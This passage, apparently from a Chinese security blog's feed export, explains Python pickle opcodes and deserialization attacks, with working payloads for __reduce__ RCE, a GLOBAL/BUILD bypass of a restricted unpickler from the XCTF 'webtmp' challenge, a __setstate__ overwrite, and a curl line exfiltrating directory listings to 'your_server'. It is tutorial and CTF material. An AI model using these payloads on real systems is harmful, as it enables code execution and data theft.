打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li><strong>v4</strong> 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</li></ul><p>以上代码除了将序列化后的字符串反汇编后还用<code>pickletools</code>的<code>optimize</code>方法来将反汇编后的代码进行了优化，优化后输出的结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">b'\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.'    </span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     '__main__ dairy'</span><br><span class="line">   18: )    EMPTY_TUPLE</span><br><span class="line">   19: \x81 NEWOBJ</span><br><span class="line">   20: &#125;    EMPTY_DICT</span><br><span class="line">   21: (    MARK</span><br><span class="line">   22: X        BINUNICODE 'date'</span><br><span class="line">   31: J        BININT     20202020</span><br><span class="line">   36: X        BINUNICODE 'text'</span><br><span class="line">   45: X        BINUNICODE '语言'</span><br><span class="line">   56: X        BINUNICODE 'tode'</span><br><span class="line">   65: ]        EMPTY_LIST</span><br><span class="line">   66: (        MARK</span><br><span class="line">   67: X            BINUNICODE '计'</span><br><span class="line">   75: X            BINUNICODE '算'</span><br><span class="line">   83: X            BINUNICODE '机'</span><br><span class="line">   91: e            APPENDS    (MARK at 66)</span><br><span class="line">   92: u        SETITEMS   (MARK at 21)</span><br><span class="line">   93: b    BUILD</span><br><span class="line">   94: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure><p>其中因为使用了<code>optimize</code>方法省略了<code>q  BINPUT   x</code>这一行汇编指令，这行指令的意思是把当前栈的栈顶复制一份，放进存储区，</p><p>下面对优化后的代码一行一行的进行解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: \x80 PROTO      3</span><br></pre></td></tr></table></figure><p><code>\x80</code>：版本(<code>protocol</code>)2后加入，机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。代表这个是依据3号协议序列化的字符串，随后这个操作结束。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2: c    GLOBAL     &#39;__main__ dairy&#39;</span><br></pre></td></tr></table></figure><p><code>c</code>操作符：连续读取两个字符串<code>module</code>和<code>name</code>，规定以<code>\n</code>为分割给<code>find_class</code>方法，然后把<code>module.name</code>压入栈，现在读取到的是<code>main.dairy</code>，放入栈中，通常用来获取一个模块中的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18: )    EMPTY_TUPLE</span><br></pre></td></tr></table></figure><p><code>)</code>操作符：把一个空的<code>tuple</code>压入当前栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">19: \x81 NEWOBJ</span><br></pre></td></tr></table></figure><p><code>\x81</code>操作符：从栈中先弹出一个元素，记为<code>args</code>，再弹出一个元素记为<code>cls</code>，接下来执行<code>cls.new(cls,*args)</code>，然后把得到的东西压入栈，简单来说，从栈中弹出一个参数和一个<code>class</code>，然后利用这个参数实例化<code>class</code>，把得到的实例压入栈 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20: &#125;    EMPTY_DICT</span><br></pre></td></tr></table></figure><p><code>}</code>操作符：把一个空的<code>dict</code>压进栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21: (    MARK</span><br></pre></td></tr></table></figure><p>MARK操作符：这个操作符干的事称为<code>load_mark</code>，把当前栈这个整体，作为一个<code>list</code>，压进前序栈，把当前栈清空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22: X        BINUNICODE &#39;date&#39;</span><br></pre></td></tr></table></figure><p><code>X</code>操作符：和V操作符一样是读入字符串压入堆栈，后面跟的四个字节代表字符串长度，如：<code>X\x04\x00\x00\x00date</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31: J        BININT     20202020</span><br></pre></td></tr></table></figure><p>J操作符：和X和V一样，只不过这个是4字节发的int型（个人理解）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65: ]        EMPTY_LIST</span><br></pre></td></tr></table></figure><p><code>]</code>操作符，把一个空的<code>list</code>压进栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">91: e            APPENDS    (MARK at 66)</span><br></pre></td></tr></table></figure><p>MARK结束，通过最上面的（66行）堆栈片扩展堆栈上的列表，简单来说就是形成一个列表（个人理解）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">92: u        SETITEMS   (MARK at 21)</span><br></pre></td></tr></table></figure><p>调用<code>pop_mark</code>，把当前栈的内容扔进一个数组<code>arr</code>，然后把当前栈恢复到MARK时的状态，从27行开始区分键值对，两个一组地读<code>arr</code>里面的元素，前者作为key，后者作为value</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">93: b    BUILD</span><br></pre></td></tr></table></figure><p>把当前栈栈顶存进<code>state</code>，然后弹掉，把当前栈顶记为<code>inst</code>，然后弹掉，利用<code>state</code>这系列的值来更新实例<code>inst</code>，把得到的对象扔到当前栈，如果<code>inst</code>拥有<code>__setstate__</code>方法，则吧<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。实际上这里就有一个安全漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">94: .    STOP</span><br></pre></td></tr></table></figure><p><code>.</code>：STOP指令，当前栈顶元素就是反序列化的最终结果，把他弹出</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><p><code>__reduce__</code>的指令码为<code>R</code>，他在反序列化的时候干了这么一件事</p><ul><li>取当前栈的栈顶记为<code>args</code>，然后把它弹掉。</li><li>取当前栈的栈顶记为<code>f</code>，然后把它弹掉。</li><li>以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈。</li></ul><p>class的<code>__reduce__</code>方法在pickle反序列化的时候会被执行（类似php中的<code>__wakeup</code>），其底层的编码方法就是利用了R指令，f要么返回字符串，要么返回一个tuple，后者就可以进行利用，payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dairy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.date = <span class="number">20202020</span></span><br><span class="line">        self.text = <span class="string">'语言'</span></span><br><span class="line">        self.tode = [<span class="string">'计'</span>,<span class="string">'算'</span>,<span class="string">'机'</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span>                      <span class="comment">#反序列化时执行，底层编码方法使用R指令码，</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'whoami'</span>,))</span><br><span class="line"></span><br><span class="line">today = dairy()</span><br><span class="line"><span class="comment">#print(pickle.dumps(today))</span></span><br><span class="line">x = pickle.dumps(today)</span><br><span class="line">x = pickletools.optimize(x)  <span class="comment">#优化，消除未使用的PUT</span></span><br><span class="line">pickletools.dis(x)           <span class="comment">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></span><br></pre></td></tr></table></figure><p>得到以下结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     'nt system'</span><br><span class="line">   13: X    BINUNICODE 'whoami'</span><br><span class="line">   24: \x85 TUPLE1</span><br><span class="line">   25: R    REDUCE</span><br><span class="line">   26: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure><p>随后将序列化的内容反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'</span></span><br><span class="line">hack = pickle.loads(b)</span><br></pre></td></tr></table></figure><p>随后就可得到命令执行的结果</p><h4 id="c指令码"><a href="#c指令码" class="headerlink" title="c指令码"></a>c指令码</h4><p>先来看下面一段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,grade)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.grade = grade</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self,other)</span>:</span>     <span class="comment"># 定义内置方法,当判断两个对象的值是否相等时，触发此方法</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> student <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.grade == other.grade</span><br><span class="line">        <span class="comment">#is比较地址</span></span><br><span class="line">print(pickle.dumps(student(<span class="string">'czj'</span>,<span class="string">'extrader'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> blue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'no reduce!'</span></span><br><span class="line">    x = pickle.loads(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(x != student(blue.name,blue.grade)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Not equal &gt;_&lt;'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'well done!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(check(base64.b64decode(input())))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>blue.py</code>中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"A"</span></span><br><span class="line">grade = <span class="string">"B"</span></span><br></pre></td></tr></table></figure><p>以上代码过滤了<code>R</code>指令码，<code>check</code>方法中检测到<code>input</code>的<code>date</code>中含有<code>R</code>指令码就直接被返回<code>no reduce!</code>，函数给出了一个输入点，在将<code>input</code>的<code>data</code>参数反序列化后需要其中的name和grade和blue这个module中的name和grade相对应，也就是说我们需要利用序列化后的student类，来令其相等</p><p>这里如果我们知道blue.py中参数的值的话，直接构造<code>name = &quot;A&quot;</code>，<code>grade = &quot;B&quot;</code>的payload即可，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174320049.png" alt=""></p><p>但是在我们不知道blue.py的前提下如何绕过呢？这里就要用到我们的c指令码了</p><p>c指令码是专门用来获取一个全局变量的</p><p>先看一下反汇编后输出的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406174942602.png" alt=""></p><p>利用c指令替换掉<code>czj</code>和<code>extrader</code>中两个字符串，将<code>pickle.dumps</code>后的<code>bytes</code>字符串中的<code>X\x03\x00\x00\x00czj</code>替换成<code>cblue\nname\n</code>，<code>X\x08\x00\x00\x00extrader</code>替换成<code>cblue\ngrade\n</code>随后base64编码后观察效果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt=""></p><p>可以清楚的看到c指令码替换成功，随后也成功的绕过了比较</p><p>但如果c指令的<code>module</code>被限制了呢？c指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法，然而<code>find_class</code>可以被重写，如果c指令码只允许包含<code>__main__</code>这一个<code>module</code>，又该如何解决？代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> blue</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name,grade)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.grade = grade</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self,other)</span>:</span>     </span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> student <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.grade == other.grade</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line">        <span class="comment">#通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'R'</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'no reduce!'</span></span><br><span class="line">        <span class="keyword">if</span> type(restricted_loads(eval(data))) <span class="keyword">is</span> <span class="keyword">not</span> student:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"false!"</span></span><br><span class="line">        x = pickle.loads(eval(data))</span><br><span class="line">        <span class="keyword">if</span>(x != student(blue.name,blue.grade)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Not equal &gt;_&lt;'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'well done!'</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(check(base64.b64decode(input().encode(<span class="string">"utf8"</span>)).decode(<span class="string">"utf8"</span>)))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>blue.py</code>中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"A"</span></span><br><span class="line">grade = <span class="string">"B"</span></span><br></pre></td></tr></table></figure><p>题目部分来自XCTF高校战疫的一道题：webtmp</p><p>这道题就将input的date的modules进行了判断，如果不是<code>__main__ student</code>则会引发错误然后退出，那该如何解决？</p><p>我们知道，通过GLOBAL引入的变量，可以看作是原变量的引用，<strong>当我们在栈上修改它的值</strong>，会导致原变量也被修改！思路如下：</p><ul><li>通过<code>__main__.blue</code>引入这一个<code>module</code>，由于命名空间还在main内，故不会拦截，也就是说，在<code>__main__</code>上再新构造一个模块，用来对数据进行改写</li><li>把一个<code>dict</code>压进栈，内容是<code>{&#39;name&#39;:&#39;B&#39;,&#39;grade&#39;:&#39;B&#39;}</code></li><li>执行<code>BUILD</code>指令，会改写<code>__main__.blue.name</code>和<code>__main__.blue.grade</code>，到这里<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li><li>弹掉栈顶，现在栈变成空的</li><li>照抄正常的Student序列化之后的字符串，压入一个正常的<code>student</code>对象，<code>name</code>和<code>grade</code>分别是<code>&#39;B&#39;</code>和<code>&#39;B&#39;</code>由于</li></ul><p>由于栈顶是正常的<code>student</code>对象（<code>if</code>语句判断用过），<code>pickle.loads</code>会返回正常，于是到手的<code>student</code>对象<code>name</code>和<code>grade</code>都与<code>blue.name</code>、<code>blue.grade</code>对应了</p><p><code>payload</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.'</span></span><br></pre></td></tr></table></figure><p>其中q指令可省略</p><p>把过程输出执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406221611185.png" alt=""></p><p>可看到成功绕过了判断</p><h4 id="setstate"><a href="#setstate" class="headerlink" title="setstate"></a>setstate</h4><p>如果<code>inst</code>有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code>里面</p><p><code>__setstate__</code>与<code>__getstate__</code>的关系：<code>pickle</code>一个类的实例时，Python 将只 <code>pickle</code> 当它调用该实例的 <code>getstate()</code> 方法时返回给它的值。类似的，在 <code>unpickle</code> 时，Python 将提供经过 <code>unpickle</code> 的值作为参数传递给实例的 <code>setstate()</code> 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">     self.val = <span class="number">2020</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span><span class="params">(self)</span>:</span></span><br><span class="line">     print(<span class="string">"I'm being pickled"</span>)</span><br><span class="line">     self.val *= <span class="number">2</span></span><br><span class="line">     <span class="keyword">return</span> self.__dict__</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span><span class="params">(self, d)</span>:</span></span><br><span class="line">     print(<span class="string">"I'm being unpickled with these values:&#123;&#125;"</span>.format(d)) </span><br><span class="line">     self.__dict__ = d</span><br><span class="line">     self.val *= <span class="number">3</span></span><br><span class="line">f = Foo()</span><br><span class="line">f_string = pickle.dumps(f)</span><br><span class="line">print(f_string)</span><br><span class="line">a = pickletools.optimize(f_string)</span><br><span class="line">pickletools.dis(a)</span><br><span class="line">f_new = pickle.loads(f_string)</span><br><span class="line">print(<span class="string">"&#123;&#125;"</span>.format(f_new.val))</span><br></pre></td></tr></table></figure><p>代码执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt=""></p><p>可看到<code>pickle</code>时执行了<code>__getstate__</code>方法，<code>unpickle</code>时执行了<code>__setstate__</code>方法，且使用了<code>__getstate__</code>方法返回的值</p><p>如果当原对象没有<code>__setstate__</code>这个方法的时候，如果我们构造了一个<code>{&#39;__setstate__&#39;: os.system}</code>来<code>BUILD</code>这个对象，就会造成任意代码执行，现在对象的<code>__setstate__</code>就变成了</p><p><code>os.system</code>，接下来再次利用<code>dir</code>来<code>BUILD</code>这个对象，就构成了<code>os.system(&#39;dir&#39;)</code>命令执行，实现了RCE</p><p><code>payload</code>：<code>b&#39;\x80\x03c__main__\nFoo\n)\x81}(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p><p>有如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">     self.val = <span class="number">2020</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span><span class="params">(self)</span>:</span></span><br><span class="line">     print(<span class="string">"I'm being pickled"</span>)</span><br><span class="line">     self.val *= <span class="number">2</span></span><br><span class="line">     <span class="keyword">return</span> self.__dict__</span><br><span class="line">f = Foo()</span><br><span class="line">f_string = pickle.dumps(f)</span><br><span class="line">print(f_string)</span><br><span class="line">a = pickletools.optimize(f_string)</span><br><span class="line">pickletools.dis(a)</span><br><span class="line">f_new = pickle.loads(f_string)</span><br><span class="line">print(<span class="string">"&#123;&#125;"</span>.format(f_new.val))</span><br><span class="line">d = <span class="string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.'</span></span><br><span class="line">c = pickletools.optimize(d)</span><br><span class="line">pickletools.dis(c)</span><br><span class="line">pickle.loads(c)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt=""></p><p>可见成功执行了命令</p><p>完整payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.'</span></span><br></pre></td></tr></table></figure><p>恶意代码执行完后将栈弹空，然后压一个正常的<code>student</code>入栈</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>其他模块的load也可以触发pickle反序列化漏洞。例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p><p>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p><p>即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(&#39;curl your_server&#x2F;&#96;ls &#x2F; | base64&#96;&#39;)</span><br></pre></td></tr></table></figure><p>然后查询您自己的服务器日志，就能看到结果。这是因为：以反引号包含的代码，在sh中会直接执行，返回其结果。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89132768</a></li><li><a href="https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA</a></li><li><a href="https://www.cnblogs.com/cioi/p/12464592.html" target="_blank" rel="noopener">https://www.cnblogs.com/cioi/p/12464592.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2020/04/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/04/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
